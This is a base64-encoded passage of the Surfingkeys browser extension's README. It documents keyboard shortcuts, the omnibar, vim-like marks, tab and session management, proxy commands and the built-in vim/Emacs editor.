Y2UgdG8gdGVtcG9yYXJpbHkgc3VwcHJlc3MgU3VyZmluZ0tleXMsIHdoaWNo
IG1lYW5zIFN1cmZpbmdrZXlzIHdpbGwgbm90IGNhcmUgYW55IGtleSBwcmVz
cyB1bnRpbCBsZWF2aW5nIHRoaXMgbW9kZSBieSBwcmVzc2luZyBgRXNjYC4g
SW4gdGhpcyBtb2RlLCB5b3UgY291bGQgdXNlIGJ1aWx0LWluIHNob3J0Y3V0
cyBmcm9tIGFueSBzaXRlIGl0c2VsZi4gUGxlYXNlIHNlZSBbRmVhdHVyZSBS
ZXF1ZXN0OiBpbXBsZW1lbnQgVmltaXVtLXN0eWxlIGluc2VydCBtb2RlIMK3
IElzc3VlICM2NTZdKGh0dHBzOi8vZ2l0aHViLmNvbS9icm9va2hvbmcvU3Vy
ZmluZ2tleXMvaXNzdWVzLzY1NikgZm9yIHdoeSB3ZSBicm91Z2h0IHRoaXMg
aW4gYW5kIHRoZSBkaWZmZXJlbmNlIGJldHdlZW4gYEFsdC1pYCBhbmQgYEFs
dC1zYC4KClRvIHByZXNzIGBwYCB0byBlbnRlciBlcGhlbWVyYWwgUGFzc1Ro
cm91Z2ggbW9kZSwgd2hpY2ggd2lsbCBhdXRvbWF0aWNhbGx5IHF1aXQgYWZ0
ZXIgMSBzZWNvbmQuIElmIHRoZSBkZWZhdWx0IHRpbWVvdXQgZG9lcyBmaXQg
eW91ciBjYXNlLCBhZGQgYmVsb3cgaW50byB5b3VyIG93biBzZXR0aW5ncyBz
Y3JpcHQgdG8gbWFrZSBpdCAxNTAwbXMuCgogICAgbWFwa2V5KCdwJywgJyMw
ZW50ZXIgZXBoZW1lcmFsIFBhc3NUaHJvdWdoIG1vZGUgdG8gdGVtcG9yYXJp
bHkgc3VwcHJlc3MgU3VyZmluZ0tleXMnLCBmdW5jdGlvbigpIHsKICAgICAg
ICBOb3JtYWwucGFzc1Rocm91Z2goMTUwMCk7CiAgICB9KTsKCiMjIE9tbmli
YXIKClRoZSBvbW5pYmFyIHByb3ZpZGVzIGtpbmRzIG9mIGZ1bmN0aW9ucyB0
aGF0IG5lZWQgdXNlciBpbnB1dCwgZm9yIGV4YW1wbGUsCgoqIE9wZW4gdXJs
KGZyb20gYm90aCBib29rbWFya3MgYW5kIGhpc3RvcnkpIHdpdGggYHRgCiog
T3BlbiBib29rbWFya3Mgd2l0aCBgYmAKKiBPcGVuIHNlYXJjaCBlbmdpbmVz
IHdpdGggYG9nYCAvIGBvd2AgLi4uCiogT3BlbiBjb21tYW5kcyB3aXRoIGA6
YAoKIyMjIGtleSBiaW5kaW5ncyBpbiBPbW5pYmFyCiogYEVudGVyYCB0byBv
cGVuIHNlbGVjdGVkIGl0ZW0gYW5kIGNsb3NlIG9tbmliYXIuCiogYEN0cmwt
RW50ZXJgIHRvIG9wZW4gc2VsZWN0ZWQgaXRlbSwgYnV0IGtlZXAgb21uaWJh
ciBvcGVuIGZvciBtb3JlIGl0ZW1zIHRvIGJlIG9wZW5lZC4KKiBgU2hpZnQt
RW50ZXJgIHRvIG9wZW4gc2VsZWN0ZWQgaXRlbSBpbiBjdXJyZW50IHRhYiBh
bmQgY2xvc2Ugb21uaWJhci4gSWYgeW91J2QgbGlrZSB0byBvcGVuIGluIGN1
cnJlbnQgdGFiIGJ5IGRlZmF1bHQsIHBsZWFzZSB1c2UgYGdvYC4KKiBgVGFi
YCB0byBmb3J3YXJkIGN5Y2xlIHRocm91Z2ggdGhlIGNhbmRpZGF0ZXMuCiog
YFNoaWZ0LVRhYmAgdG8gYmFja3dhcmQgY3ljbGUgdGhyb3VnaCB0aGUgY2Fu
ZGlkYXRlcy4KKiBgQ3RybC0uYCB0byBzaG93IHJlc3VsdHMgb2YgbmV4dCBw
YWdlCiogYEN0cmwtLGAgdG8gc2hvdyByZXN1bHRzIG9mIHByZXZpb3VzIHBh
Z2UKKiBgQ3RybC1jYCB0byBjb3B5IGFsbCBsaXN0ZWQgaXRlbXMKCkluIG9t
bmliYXIgb3BlbmVkIHdpdGggYHRgOgoKYEN0cmwgLSBkYCB0byBkZWxldGUg
ZnJvbSBib29rbWFyayBvciBoaXN0b3J5CgpJbiBvbW5pYmFyIG9wZW5lZCB3
aXRoIGBiYDoKCmBDdHJsIC0gU2hpZnQgLSA8YW55IGxldHRlcj5gIHRvIGNy
ZWF0ZSB2aW0tbGlrZSBtYXJrCgohW3NlYXJjaF9lbmdpbmVdKGh0dHBzOi8v
Y2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8yODgyMDcvMTc2
NDQyMTQvNzU5ZWYxZDQtNjFiMy0xMWU2LTliZDktNzBjMzhjOGI4MGUwLmdp
ZikKCmBjbWFwYCBjb3VsZCBiZSB1c2VkIGZvciBPbW5pYmFyIHRvIGNoYW5n
ZSBtYXBwaW5ncywgZm9yIGV4YW1wbGU6CgogICAgY21hcCgnPEN0cmwtbj4n
LCAnPFRhYj4nKTsKICAgIGNtYXAoJzxDdHJsLXA+JywgJzxTaGlmdC1UYWI+
Jyk7CgojIyMgQWRkIGJvb2ttYXJrCmBhYmAgaXMgYSBzaG9ydGN1dCB0byBi
b29rbWFyayBjdXJyZW50IHBhZ2UuIEFuIE9tbmliYXIgaXMgZGlzcGxheWVk
IGZvciB5b3UgdG8gY2hvb3NlIGEgZm9sZGVyIHRvIHBsYWNlIHRoZSBuZXcg
Ym9va21hcmsgYWZ0ZXIgeW91IHByZXNzZWQgYGFiYC4gSWYgeW91IHdhbnQg
dG8gcGxhY2UgdGhlIG5ldyBib29rbWFyayBpbnRvIGEgbmV3IGZvbGRlciwg
eW91IGNvdWxkIGlucHV0IGZvbGRlciBuYW1lIC0tICoqd2hpY2ggbXVzdCBi
ZSBlbmRlZCB3aXRoIGAvYCoqIGluIE9tbmliYXIuIEZvciBleGFtcGxlLCBJ
IGNob29zZSBmb2xkZXIgYC9Cb29rbWFya3MgQmFyL3Rvb2wvYCwgYW5kIGFw
cGVuZCBgYWJjL2AsIHRoZW4gY3VycmVudCBwYWdlIHdpbGwgYmUgYm9va21h
cmtlZCBpbnRvIGAvQm9va21hcmtzIEJhci90b29sL2FiYy9gLiBJZiB0aGVy
ZSBpcyBubyBgL2AgYmVoaW5kIGBhYmNgLCBgYWJjYCB3aWxsIGJlIHVzZWQg
YXMgdGl0bGUgb2YgdGhlIG5ldyBib29rbWFyay4KCiMjIFNlYXJjaCBzZWxl
Y3RlZCB3aXRoCgpNeSBmYXZvcml0ZSBmZWF0dXJlIGZyb20gd2hlbiBJIHdh
cyB1c2luZyBGaXJlZm94LiBGb3IgYm90aCBGaXJlZm94IGFuZCBDaHJvbWUs
IHRoZSBleHRlbnNpb25zIG1ha2UgaXQgdGhyb3VnaCBjb250ZXh0IG1lbnUu
IFN1cmZpbmdrZXlzIG1ha2VzIGl0IHRocm91Z2gga2V5IG1hcHBpbmdzLiBC
eSBkZWZhdWx0LCB3aGVuIHlvdSBwcmVzcyBgc2dgIGluIG5vcm1hbCBtb2Rl
LCBpdCB3aWxsIHNlYXJjaCBzZWxlY3RlZCB0ZXh0IHdpdGggZ29vZ2xlLCBp
ZiB0aGVyZSBpcyBub25lIHNlbGVjdGVkLCBpdCB3aWxsIHNlYXJjaCB0ZXh0
IGZyb20gc3lzdGVtIGNsaXBib2FyZCB3aXRoIGdvb2dsZS4gSW4gdmlzdWFs
IG1vZGUsIGl0IHdpbGwgc2VhcmNoIHNlbGVjdGVkIHRleHQgd2l0aCBnb29n
bGUuCgpUaGUgYGdgIGluIGBzZ2AgaXMgYSBzZWFyY2ggYWxpYXMgZm9yIGdv
b2dsZSwgdGhlcmUgYXJlIHNvbWUgb3RoZXIgYnVpbHQtaW4gc2VhcmNoIGFs
aWFzZXMgLS0gbGlrZSBgd2AgZm9yIGJpbmcuIFNvIHByZXNzIGBzd2AgdG8g
c2VhcmNoIHNlbGVjdGVkIHdpdGggYmluZy4gUmVmZXIgdG8gW0FkZCBzZWFy
Y2ggYWxpYXMgdG8gb21uaWJhcl0oI2FkZC1zZWFyY2gtYWxpYXMtdG8tb21u
aWJhcikgdG8gYWRkIHlvdXIgb3duIHNlYXJjaCBhbGlhcywgZXNwZWNpYWxs
eSB0aG9zZSBzZWFyY2ggZW5naW5lcyBmb3IgY29tcGFueSBpbnNpZGUuCgpC
ZXNpZGVzIHRoYXQsIHRoZXJlIGlzIGEgYHNvZ2AsIHRvIHNlYXJjaCBzZWxl
Y3RlZCB0ZXh0IG9ubHkgaW4gdGhpcyBzaXRlIHdpdGggZ29vZ2xlLiBGb3Ig
YHNvZ2AsIGBzYCBpcyB0aGUgc2VhcmNoX2xlYWRlcl9rZXksIGBvYCBpcyB0
aGUgb25seV90aGlzX3NpdGVfa2V5LCBgZ2AgaXMgdGhlIHNlYXJjaCBhbGlh
cy4KClRoZSBzZWFyY2hfbGVhZGVyX2tleSBgc2AgcGx1cyBjYXBpdGFsIGFs
aWFzIGBHYCB3aWxsIHNlYXJjaCBzZWxlY3RlZCB3aXRoIGdvb2dsZSBpbnRl
cmFjdGl2ZWx5LCBhbGwgb3RoZXIgc2VhcmNoIGFsaWFzZXMgYW5kIHRob3Nl
IHlvdSBhZGRlZCB0aHJvdWdoIEFQSSBgYWRkU2VhcmNoQWxpYXNYYCB3b3Jr
IGluIHNhbWUgd2F5LgoKIyMgVmltLWxpa2UgbWFya3MKCllvdSBjYW4gY3Jl
YXRlIHZpbS1saWtlIG1hcmtzIGJ5IHByZXNzaW5nIGBtYCwgZm9sbG93ZWQg
YnkgYSB3b3JkIGNoYXJhY3RlcigwLTkgLyBhLXogLyBBLVopLCB1c2VkIGFz
IG1hcmsgbmFtZS4gRm9yIGV4YW1wbGUsIGlmIHlvdSBwcmVzcyBgbWFgIG9u
IHRoaXMgcGFnZSwgeW91J2xsIGNyZWF0ZSBhIG1hcmsgbmFtZWQgYGFgIHdo
aWNoIHBvaW50cyB0byB0aGlzIHBhZ2UuIFRoZW4gcHJlc3NpbmcgYCdhYCBh
bnl3aGVyZSwgeW91J2xsIGp1bXAgdG8gdGhpcyBwYWdlLgoKSW4gdGhpcyB3
YXksIHRoZSBjcmVhdGVkIG1hcmsgYWx3YXlzIHBvaW50cyB0byBjdXJyZW50
IFVSTC4gWW91IGNhbiBhbHNvIGNyZWF0ZSB2aW0tbGlrZSBtYXJrcyBmcm9t
IHRoZSBib29rbWFya3MuIFRyeSBmb2xsb3dpbmcgc3RlcHM6CgoxLiBwcmVz
cyBgYmAgdG8gb3BlbiBib29rbWFya3MuCjEuIHR5cGUgc29tZXRoaW5nIHRv
IGxvY2F0ZSB0aGUgVVJMIHlvdSdkIGxpa2UgdG8gY3JlYXRlIHZpbS1saWtl
IG1hcmsgZm9yLgoxLiBIb2xkIEN0cmwgKyBTaGlmdCwgcHJlc3MgYSBtYXJr
IG5hbWUsIHN1Y2ggYXMgYGZgLgoKVGhlbiBhZnRlcndhcmRzIGAnRmAgd2ls
bCBvcGVuIHRoYXQgVVJMIGRpcmVjdGx5LgoKVGhpcyBpcyB2ZXJ5IHVzZWZ1
bCBmb3IgdGhvc2UgcGFnZXMgeW91IGFjY2VzcyB2ZXJ5IGZyZXF1ZW50bHku
IGBvbWAgdG8gY2hlY2sgb3V0IGFsbCB0aGUgdmltLWxpa2UgbWFya3MgeW91
IGhhdmUgY3JlYXRlZC4KCiMjIFN3aXRjaCB0YWJzCgpCeSBkZWZhdWx0LCBw
cmVzc2luZyBgVGAgd2lsbCBzaG93IGFsbCBvcGVuZWQgdGFicyBpbiBhbiBv
dmVybGF5LCB0aGVuIHByZXNzaW5nIHRoZSBoaW50IGNoYXIsIHdpbGwgc3dp
dGNoIHRvIHRoZSByZWxhdGVkIHRhYi4KCiFbdGFic19vdmVybGF5XShodHRw
czovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMvMjg4MjA3
LzEwNTQ0NjM2LzI0NTQ0N2Y2LTc0NTctMTFlNS04MzcyLTYyYjhmNjMzNzE1
OC5wbmcpCgpUaGVyZSBpcyBgc2V0dGluZ3MudGFic1RocmVzaG9sZGAgaGVy
ZS4gV2hlbiB0b3RhbCBvZiBvcGVuZWQgdGFicyBleGNlZWRzIGBzZXR0aW5n
cy50YWJzVGhyZXNob2xkYChkZWZhdWx0IGFzIDkpLCBvbW5pYmFyIHdpbGwg
YmUgdXNlZCBmb3IgY2hvb3NpbmcgdGFicy4KCiFbdGFic19vbW5pYmFyXSho
dHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMvMjg4
MjA3LzEwNTQ0NjMwLzFmYmRkMDJjLTc0NTctMTFlNS04MjNjLTE0NDExMzEx
YzMxNS5wbmcpCgpJZiB5b3UgcHJlZmVyIHRvIHVzZSBvbW5pYmFyIGFsd2F5
cywgdXNlIGJlbG93IG1hcHBpbmc6CgogICAgbWFwa2V5KCc8U3BhY2U+Jywg
J0Nob29zZSBhIHRhYiB3aXRoIG9tbmliYXInLCBmdW5jdGlvbigpIHsKICAg
ICAgICBGcm9udC5vcGVuT21uaWJhcih7dHlwZTogIlRhYnMifSk7CiAgICB9
KTsKCndoaWNoIHdvcmtzIHNhbWUgYXM6CgogICAgc2V0dGluZ3MudGFic1Ro
cmVzaG9sZCA9IDA7CgpUaGUgdGFicyBhcmUgZGlzcGxheWVkIGluIE1SVSBv
cmRlciBieSBkZWZhdWx0LCBlaXRoZXIgaW4gb21uaWJhciBvciBvdmVybGF5
LiBJZiB5b3Ugd2FudCB0aGVtIGluIG5hdHVyYWwgb3JkZXIsIHVzZToKCiAg
ICBzZXR0aW5ncy50YWJzTVJVT3JkZXIgPSBmYWxzZTsKCiMjIENvbW1hbmRz
CgpgOmAgdG8gb3BlbiBvbW5pYmFyIGZvciBjb21tYW5kcywgdGhlbiB5b3Ug
Y2FuIGV4ZWN1dGUgYW55IHByZS1kZWZpbmVkIHRoZXJlLiBUaGUgcmVzdWx0
IHdpbGwgYmUgZGlzcGxheWVkIGJlbG93IHRoZSBvbW5pYmFyLgoKICAgIC8v
IGNyZWF0ZSBzaG9ydGN1dHMgZm9yIHRoZSBjb21tYW5kIHdpdGggZGlmZmVy
ZW50IHBhcmFtZXRlcnMKICAgIG1hcCgnc3BhJywgJzpzZXRQcm94eU1vZGUg
YWx3YXlzJyk7CiAgICBtYXAoJ3NwYicsICc6c2V0UHJveHlNb2RlIGJ5aG9z
dCcpOwogICAgbWFwKCdzcGQnLCAnOnNldFByb3h5TW9kZSBkaXJlY3QnKTsK
CkJlc2lkZXMgY29tbWFuZHMsIHlvdSBjYW4gYWxzbyBydW4gamF2YXNjcmlw
dCBjb2RlLgoKIVtjb21tYW5kc19pbl9vbW5pYmFyXShodHRwczovL2Nsb3Vk
LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMvMjg4MjA3LzExNTI3ODAx
L2ZhZGVlODJjLTk5MWQtMTFlNS05MmU5LWIwNTQ3OTZhNmE3NS5wbmcpCgoj
IyBTbW9vdGggc2Nyb2xsCgpTbW9vdGggc2Nyb2xsIHdvcmtzIGZvciBhbnkg
c2Nyb2xsYWJsZSBlbGVtZW50LiBJdCBpcyBvbiBieSBkZWZhdWx0LCB0byB0
dXJuIGl0IG9mZiBhcyBiZWxvdzoKCiAgICBzZXR0aW5ncy5zbW9vdGhTY3Jv
bGwgPSBmYWxzZTsKCmBqYC9ga2Agc2Nyb2xscyBpbiBvbmUgc3RlcCB3aXRo
IHNpemUgYXMgNzAsIHlvdSBjb3VsZCBjaGFuZ2UgaXQgYXMgYmVsb3c6Cgog
ICAgc2V0dGluZ3Muc2Nyb2xsU3RlcFNpemUgPSAxNDA7CgojIyBTZXNzaW9u
IG1hbmFnZW1lbnQKClRvIGNyZWF0ZSBzZXNzaW9uIGluIENocm9tZSB3aXRo
IFN1cmZpbmdrZXlzIHdpbGwgc2F2ZSBVUkxzIGZvciBhbGwgdGFicywgYW5k
IHRvIG9wZW4gYSBzZXNzaW9uIHdpbGwgb3BlbiBhbGwgdGhlIFVSTHMgb2Yg
dGhlIHNlc3Npb24gaW4gZGlmZmVyZW50IHRhYiwgc28gYmFzaWNhbGx5IGEg
c2Vzc2lvbiBpcyBhIGxpc3Qgb2YgVVJMcywgd2hpY2ggaGFzIGEgbmFtZS4K
CiogYFpaYCB3aWxsIHNhdmUgYWxsIGN1cnJlbnQgdGFicyBpbnRvIGEgc2Vz
c2lvbiBuYW1lZCBgTEFTVGAgdGhlbiBxdWl0LgoqIGBaUmAgd2lsbCByZXN0
b3JlIHRoZSBzZXNzaW9uIG5hbWVkIGBMQVNUYC4KKiBgWlFgIHdpbGwganVz
dCBxdWl0LgoKWW91IGNhbiBjcmVhdGUgbXVsdGlwbGUgc2Vzc2lvbnMgd2l0
aCBkaWZmZXJlbnQgbmFtZXMgaW4gY29tbWFuZCBtb2RlLiBQcmVzcyBgOmAg
dG8gb3BlbiBvbW5pYmFyIGZvciBjb21tYW5kcywgdGhlbiBpbnB1dDoKCiAg
ICBjcmVhdGVTZXNzaW9uIHdvcmtzCgpTdXJmaW5na2V5cyB3aWxsIGNyZWF0
ZSBhIHNlc3Npb24gbmFtZWQgYHdvcmtzYCBmb3IgeW91LCB0byBvcGVuIHRo
ZSBzZXNzaW9uIHdpdGggY29tbWFuZCBpbnB1dCBhczoKCiAgICBvcGVuU2Vz
c2lvbiB3b3JrcwoKVG8gbGlzdCBhbGwgeW91ciBzYXZlZCBzZXNzaW9uczoK
CiAgICBsaXN0U2Vzc2lvbgoKVG8gZGVsZXRlIGEgc2Vzc2lvbjoKCiAgICBk
ZWxldGVTZXNzaW9uIHdvcmtzCgojIyBSZXBlYXRzIGFjdGlvbiBieSBwcmVz
c2luZyBudW1iZXIgYmVmb3JlIG1hcGtleQoKSWYgeW91IG5lZWQgcmVwZWF0
IHNvbWUgYWN0aW9uIHNldmVyYWwgdGltZXMsIGp1c3QgcHJlc3MgYSBudW1i
ZXIgYmVmb3JlIG1hcGtleSwgc3VjaCBhcyBgM2RgLCB3aGljaCB3aWxsIHNj
cm9sbCBkb3duIDMgcGFnZXMuIFJlcGVhdHMgYWxzbyB3b3JrcyBmb3IgVGFi
IG5hdmlnYXRpb24sIGZvciBleGFtcGxlLCB5b3UncmUgbm93IG9uIHRoZSAx
c3QgVGFiLCBhbmQgeW91IHdhbnQgdG8gc3dpdGNoIHRvIHRoZSA0dGggVGFi
LAoKKiBwcmVzcyBgM1JgIHRvIGFjaGlldmUgdGhhdAoqIGAzRWAgd2lsbCBz
d2l0Y2ggYmFjayB0byAxc3QgVGFiLgoKQW5vdGhlciBleGFtcGxlIHRvIG1v
dmUgb25lIFRhYiwgc2F5LCB5b3UncmUgb24gdGhlIDEydGggVGFiIG9mIDIz
IHRhYnMuCgoqIGAxMTw8YCB3aWxsIG1vdmUgY3VycmVudCB0YWIgdG8gYmVn
aW5uaW5nLgoqIGAxMD4+YCB3aWxsIG1vdmUgY3VycmVudCB0YWIgdG8gZW5k
LgoKVXN1YWxseSwgeW91IG5lZWQgbm90IGNvdW50IHRoZSBudW1iZXIsIHlv
dSBqdXN0IHByZWZpeCBhIGxhcmdlIG51bWJlciBzdWNoIGFzIGA5OTw8YCwg
aWYgeW91IHdhbnQgdG8gbW92ZSBhIHRhYiB0byBiZWdpbm5pbmcgb3IgZW5k
LgoKIyMgSG90a2V5IHRvIHRvZ2dsZSBTdXJmaW5na2V5cwoKQnkgZGVmYXVs
dCwgYEFsdC1zYCB3aWxsIHRvZ2dsZSBTdXJmaW5na2V5cyBmb3IgY3VycmVu
dCBzaXRlLiBXaGVuIFN1cmZpbmdrZXlzIGlzIHR1cm5lZCBvZmYsIGFsbCBt
YXBwaW5ncyBzdG9wIHdvcmtpbmcgZXhjZXB0IHRoZSBob3RrZXkuIFRvIGNo
YW5nZSBob3RrZXksIHVzZSBzZXR0aW5ncyBiZWxvdzoKCiAgICBtYXAoJzxD
dHJsLWk+JywgJzxBbHQtcz4nKTsgLy8gaG90a2V5IG11c3QgYmUgb25lIGtl
eXN0cm9rZSB3aXRoL3dpdGhvdXQgbW9kaWZpZXIsIGl0IGNhbiBub3QgYmUg
YSBzZXF1ZW5jZSBvZiBrZXlzdHJva2VzIGxpa2UgYGdnYC4KCldoZW4gU3Vy
ZmluZ2tleXMgaXMgdHVybmVkIG9mZiBvbiBzb21lIHNpdGUgYnkgYEFsdC1z
YCwgdGhlIHN0YXR1cyB3aWxsIGJlIHBlcnNpc3RlZCBpbiBzZXR0aW5ncywg
Zm9yIGV4YW1wbGUsCgogICAgImJsYWNrbGlzdCI6IHsKICAgICAgICAiaHR0
cHM6Ly9naXRodWIuY29tIjogMQogICAgfSwKCmBBbHQtc2Agb25jZSBtb3Jl
IHdpbGwgcmVtb3ZlIGl0IGZyb20gc2V0dGluZ3MuYmxhY2tsaXN0LiBUaGUg
ZGF0YSBzZXR0aW5ncyBhcmUgbm90IGFsd2F5cyBwcmVzZW50ZWQgaW4gc25p
cHBldHMsIHlvdSBjb3VsZCB1c2UgYHlqYCB0byBkdW1wIGFsbCBzZXR0aW5n
cyBpbnRvIGNsaXBib2FyZCwgdGhlbiBwYXN0ZSBpdCBpbiB5b3VyIHRleHQg
ZWRpdG9yIHRvIGNoZWNrIG91dC4KCkFub3RoZXIgd2F5IHRvIGRpc2FibGUg
U3VyZmluZ2tleXMgaXMgdG8gdXNlIGBzZXR0aW5ncy5ibGFja2xpc3RQYXR0
ZXJuYCwgcGxlYXNlIHJlZmVyIHRvIFtyZWdleCBmb3IgZGlzYWJsaW5nXSho
dHRwczovL2dpdGh1Yi5jb20vYnJvb2tob25nL1N1cmZpbmdrZXlzL2lzc3Vl
cy82MykuCgojIyBQcm94eSBzZXR0aW5ncwoKU3dpdGNoeVNoYXJwIGlzIGEg
Z3JlYXQgZXh0ZW5zaW9uIHRvIHN3aXRjaCBwcm94eSwgYnV0IG15IHVzZSBj
YXNlIHdpdGggaXQgaXMgdmVyeSBzaW1wbGUsCgoxLiBjcmVhdGUgYSBwcm9m
aWxlIHVzaW5nIFBBQyBzY3JpcHQuCjEuIG1haW50YWluIHNpdGUgbGlzdCBp
biB0aGUgUEFDIHNjcmlwdCwgdXNlIHByb3h5IGlmIHRoZSBzaXRlIGJlaW5n
IGFjY2Vzc2VkIGlzIGluIHRoZSBsaXN0LgoxLiB3aGVuZXZlciBJIGNvbWUg
aW50byBhIHNpdGUgYmxvY2tlZCBieSBzb21ldGhpbmcsIEkgYWRkIGl0IHRv
IHRoZSBsaXN0IGluIFBBQyBzY3JpcHQuCjEuIGNsaWNrIHRoZSBTd2l0Y2h5
U2hhcnAgaWNvbiB0byByZWxvYWQgdGhlIHByb2ZpbGUuCjEuIGNhc3VhbGx5
IEkgY2xpY2sgdGhlIFN3aXRjaHlTaGFycCBpY29uIHRvIHN3aXRjaCBwcm9m
aWxlIGJldHdlZW4gYGRpcmVjdGAgYW5kIGBwYWNfc2NyaXB0YC4KClRvIGF2
b2lkIG1hbnVhbGx5IGVkaXRpbmcgUEFDIHNjcmlwdCBhbmQgcmVsb2FkaW5n
L3N3aXRjaGluZyBwcm9maWxlIGJ5IGNsaWNraW5nIFN3aXRjaHlTaGFycCBp
Y29uLCBJIHJlcGxhY2VkIFN3aXRjaHlTaGFycCBieSBpbnRlZ3JhdGluZyBw
cm94eSBzZXR0aW5ncyBpbnRvIFN1cmZpbmdrZXlzLCBhbmQgcHJvdmlkZXMg
cmVsYXRlZCBjb21tYW5kcyBhbmQgc2hvcnRjdXRzLgoKKiBzZXRQcm94eSwg
dG8gc2V0IHByb3h5LCBzb21lIGV4YW1wbGVzOgoKICAgICAgICBzZXRQcm94
eSAxOTIuMTY4LjEuMTAwOjgwODAKICAgICAgICBzZXRQcm94eSAxMjcuMC4w
LjE6MTA4MCBTT0NLUzUKCiogc2V0UHJveHlNb2RlLCB0byBzZXQgcHJveHkg
bW9kZSwgdGhlcmUgYXJlIGZpdmUgbW9kZXM6IGRpcmVjdCwgYnlob3N0LCBi
eXBhc3MsIGFsd2F5cywgc3lzdGVtIGFuZCBjbGVhci4KCiAgICAgICAgZGly
ZWN0ICAgICAgQ2hyb21lIHdpbGwgY29ubmVjdCB0byBhbGwgc2l0ZXMgZGly
ZWN0bHkuCiAgICAgICAgYnlob3N0ICAgICAgQ2hyb21lIHdpbGwgb25seSBj
b25uZWN0IHRvIHNpdGVzIGFkZGVkIGJ5IGBhZGRQcm94eVNpdGVgIHRocm91
Z2ggcmVsYXRlZCBwcm94eS4gWW91IGNvdWxkIGFkZCBtdWx0aXBsZSBwYWly
cyBvZiBgcHJveHlgIGFuZCBgaG9zdHNgLCBmb3IgaG9zdHMgbWF0Y2hlZCB3
aXRoIGBob3N0c2AgYHByb3h5YCB3aWxsIGJlIHVzZWQuCiAgICAgICAgYnlw
YXNzICAgICAgQ2hyb21lIHdpbGwgY29ubmVjdCB0byBhbGwgc2l0ZXMgdGhy
b3VnaCBwcm94eSwgd2l0aCBzcGVjaWZpZWQgaG9zdHMgZXhjbHVkZWQuCiAg
ICAgICAgYWx3YXlzICAgICAgQ2hyb21lIHdpbGwgY29ubmVjdCB0byBhbGwg
c2l0ZXMgdGhyb3VnaCBwcm94eS4KICAgICAgICBzeXN0ZW0gICAgICBVc2Ug
cHJveHkgY29uZmlndXJhdGlvbiB0YWtlbiBmcm9tIHRoZSBvcGVyYXRpbmcg
c3lzdGVtLgogICAgICAgIGNsZWFyICAgICAgIFN1cmZpbmdrZXlzIHdpbGwg
bm90IHRha2UgY29udHJvbCBvZiBwcm94eSBzZXR0aW5ncywgdGhpcyBpcyB0
aGUgZGVmYXVsdCBtb2RlLgoKKiBhZGRQcm94eVNpdGUsIHJlbW92ZVByb3h5
U2l0ZSwgdG9nZ2xlUHJveHlTaXRlLCB0byBtYWtlIENocm9tZSBjb25uZWN0
IHRvIHNpdGUgdGhyb3VnaCBwcm94eSBvciBub3QsIGV4YW1wbGVzOgoKICAg
ICAgICBhZGRQcm94eVNpdGUgZ29vZ2xlLmNvbSxmYWNlYm9vay5jb20sdHdp
dHRlci5jb20KCiogcHJveHlJbmZvLCB0byBsaXN0IHByb3h5IHlvdSBzZXQg
YnkgYHNldFByb3h5YCwgcHJveHkgbW9kZSB5b3Ugc2V0IGJ5IGBzZXRQcm94
eU1vZGVgIGFuZCBzaXRlcyB5b3UgYWRkL3JlbW92ZSBieSBgYWRkUHJveHlT
aXRlYC9gcmVtb3ZlUHJveHlTaXRlYC9gdG9nZ2xlUHJveHlTaXRlYC4KCiog
YGNwYCwgdG9nZ2xlIHByb3h5IGZvciBjdXJyZW50IHNpdGUuCgoqIGBzcGFg
LCBzaG9ydGN1dCBmb3IgYDpzZXRQcm94eU1vZGUgYWx3YXlzYAoKKiBgc3Bi
YCwgc2hvcnRjdXQgZm9yIGA6c2V0UHJveHlNb2RlIGJ5aG9zdGAKCiogYHNw
Y2AsIHNob3J0Y3V0IGZvciBgOnNldFByb3h5TW9kZSBjbGVhcmAKCiogYHNw
ZGAsIHNob3J0Y3V0IGZvciBgOnNldFByb3h5TW9kZSBkaXJlY3RgCgoqIGBz
cHNgLCBzaG9ydGN1dCBmb3IgYDpzZXRQcm94eU1vZGUgc3lzdGVtYAoKKiBg
c3BpYCwgc2hvcnRjdXQgZm9yIGA6cHJveHlJbmZvYAoKIyMgVklNIGVkaXRv
ciBhbmQgRW1hY3MgZWRpdG9yCgpUaGFua3MgQUNFIGZvciB0aGUgdmltIGVk
aXRvciwgU3VyZmluZ2tleXMgaW50ZWdyYXRlcyBBQ0UgZm9yIHRoZSB2aW0g
ZWRpdG9yLiBUaGUgdmltIGVkaXRvciBpcyB1c2VkOgoKKiB0byBlZGl0IGFu
eSBpbnB1dCBvbiBodG1sIHBhZ2UKKiB0byBlZGl0IFVSTCB0byBvcGVuIGlu
IG5ldyB0YWIKKiB0byBlZGl0IHNldHRpbmdzCgpZb3UgY291bGQgY2hhbmdl
IHRvIEVtYWNzIGtleWJpbmRpbmdzIGZvciB0aGUgZWRpdG9yIGJ5IGFkZGlu
ZyBiZWxvdyBzZXR0aW5nczoKCiAgICBzZXR0aW5ncy5hY2VLZXliaW5kaW5n
cyA9ICJlbWFjcyI7CgpXaXRoIEVtYWNzIGtleWJpbmRpbmdzLCB1c2UgYEMt
eCBDLXNgIHRvIHNhdmUgeW91ciBpbnB1dC4KCiMjIyBFZGl0IGFueSBpbnB1
dCBvbiBodG1sIHBhZ2UKCkluIG5vcm1hbCBtb2RlLCBwcmVzcyBjYXBpdGFs
IGBJYCwgdGhlbiB1c2UgYSBoaW50IGxldHRlciB0byBwaWNrIHVwIGEgaW5w
dXQgYm94LiBBIHZpbSBlZGl0b3IgaXMgb3BlbmVkIGZvciB5b3UgdG8gZWRp
dCB0ZXh0LiBUaGUgdmltIGVkaXRvciBpcyBvcGVuZWQgaW4gc2xpZ2h0bHkg
ZGlmZmVyZW50IHdheSBmb3IgYDxpbnB1dD5gLCBgPHRleHRhcmVhPmAsIGFu
ZCBgPHNlbGVjdD5gIGVsZW1lbnRzLgoKRm9yIGA8aW5wdXQ+YCBlbGVtZW50
cywgdGhlIHZpbSBlZGl0b3IgaGFzIG9ubHkgb25lIGxpbmUsIGFuZCB5b3Ug
dXNlIHZpbSBrZXkgYmluZGluZ3MgdG8gZWRpdCB5b3VyIHRleHQuIFRoZW4g
cHJlc3MgYEVudGVyYCBvciBgOndgIHRvIHdyaXRlIHlvdXIgdGV4dCBiYWNr
IHRvIHRoZSBgPGlucHV0PmAgZWxlbWVudC4KCiFbaW5wdXRfd2l0aF92aW1d
KGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8y
